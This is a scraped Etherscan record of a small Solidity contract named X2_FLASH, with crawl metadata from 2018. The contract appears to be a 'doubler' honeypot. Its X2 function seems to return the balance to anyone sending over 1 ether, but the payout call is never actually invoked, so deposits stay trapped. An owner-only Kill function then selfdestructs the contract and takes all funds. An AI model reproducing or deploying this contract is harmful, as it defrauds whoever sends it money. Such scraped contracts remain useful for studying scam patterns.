//token_name	
//token_url	https://etherscan.io//address/0x2F30fF3428D62748A1d993F2Cc6C9B55dF40B4d7#code
//spider_time	2018/07/08 11:26:31
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.19;

contract X2_FLASH  
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function X2()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}